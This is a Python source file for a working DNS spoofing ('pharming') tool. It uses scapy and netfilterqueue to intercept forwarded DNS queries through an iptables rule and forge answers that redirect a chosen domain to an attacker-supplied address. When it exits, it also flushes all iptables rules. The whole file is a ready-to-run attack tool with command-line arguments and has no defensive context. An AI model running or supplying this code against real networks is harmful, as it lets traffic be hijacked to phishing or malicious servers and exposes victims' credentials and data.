from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import argparse


pharming_target = None
pharming_site = None


def dns_spoof(payload):
    data = payload.get_payload()
    packet = IP(data)

    dstip = packet[IP].src
    srcip = packet[IP].dst
    dport = packet[UDP].sport
    sport = packet[UDP].dport

    if not packet.haslayer(DNSQR):
        payload.accept()
    else:
        rrname = packet[DNS].qd.qname
        dnsid = packet[DNS].id
        qd = packet[DNS].qd

        if pharming_target.encode() in rrname:
            P_IP = IP(dst=dstip, src=srcip)
            P_UDP = UDP(dport=dport, sport=sport)
            dnsrr = DNSRR(rrname=rrname, ttl=10, rdata=pharming_site)
            P_DNS = DNS(id=dnsid, qr=1, aa=1, qd=qd, an=dnsrr)
            spoof_packet = P_IP / P_UDP / P_DNS
            payload.set_payload(bytes(spoof_packet))
            payload.accept()
            print('+DNS SPOOFING [%s] -> [%s]' % (pharming_target, pharming_site))
        else:
            payload.accept()

def main():
    print('DNS SPOOF START...')
    os.system('iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1')

    q = NetfilterQueue()
    q.bind(1, dns_spoof)

    try:
        q.run()
    except KeyboardInterrupt:
        print("EXIT...")
    finally:
        print('\n---RECOVER IPTABLES...')
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='This is a simple dns spoofer using scapy and netfilterqueue')
    parser.add_argument('target', type=str, metavar='TARGET', help='pharming target domain name')
    parser.add_argument('site', type=str, metavar='SITE', help='pharming site')
    args = parser.parse_args()

    pharming_target = args.target
    pharming_site = args.site

    main()
